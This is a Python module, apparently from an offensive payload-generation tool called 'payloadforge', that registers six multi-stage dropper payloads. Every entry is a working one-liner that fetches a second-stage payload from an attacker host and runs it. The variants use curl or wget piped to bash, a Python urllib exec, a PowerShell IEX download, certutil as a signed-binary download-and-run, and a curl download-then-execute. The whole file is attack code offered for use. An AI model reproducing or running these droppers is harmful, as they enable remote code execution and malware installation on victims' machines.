"""Payload chains — multi-stage droppers.

A chain payload is small and inconspicuous; it fetches a second
payload over HTTP and executes it. The HTTP server is the one started
by `serve` (uses `http_port`, default 8080). The listener is separate
(uses `lport`, default 4444).
"""

from payloadforge.payloads.registry import register

register(
    "chain_bash_curl",
    "chain", "bash",
    "curl -s http://{lhost}:{http_port}/stager.sh | bash",
    "Bash dropper — fetches /stager.sh over HTTP and pipes to bash.",
    testable=False,
    test_note="Run `serve` with stager.sh in the docroot first.",
    tags=["chain", "dropper", "bash"],
)

register(
    "chain_bash_wget",
    "chain", "bash",
    "wget -qO- http://{lhost}:{http_port}/stager.sh | bash",
    "wget variant of the bash dropper.",
    testable=False,
    test_note="Run `serve` with stager.sh in the docroot first.",
    tags=["chain", "dropper", "bash"],
)

register(
    "chain_python",
    "chain", "python",
    "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{lhost}:{http_port}/stager.py\").read())'",
    "Python dropper — fetches and executes /stager.py in memory.",
    testable=False,
    test_note="Run `serve` with stager.py in the docroot first.",
    tags=["chain", "dropper", "python"],
)

register(
    "chain_powershell",
    "chain", "powershell",
    "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{http_port}/stager.ps1')",
    "PowerShell dropper — downloads stager.ps1 and executes in memory.",
    testable=False,
    test_note="Run `serve` with stager.ps1 in the docroot first. Needs pwsh or Windows.",
    tags=["chain", "dropper", "powershell"],
)

register(
    "chain_certutil",
    "chain", "cmd",
    "certutil -urlcache -split -f http://{lhost}:{http_port}/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe",
    "Certutil dropper — uses a signed Windows binary to download and run p.exe.",
    testable=False,
    test_note="Windows-only. Run `serve` with p.exe in the docroot.",
    tags=["chain", "dropper", "lolbin", "certutil"],
)

register(
    "chain_curl_exec",
    "chain", "bash",
    "curl -s http://{lhost}:{http_port}/p -o /tmp/p && chmod +x /tmp/p && /tmp/p",
    "Curl download-and-execute. File hits disk before running.",
    testable=False,
    test_note="Run `serve` with an executable named 'p' in the docroot.",
    tags=["chain", "dropper", "bash"],
)
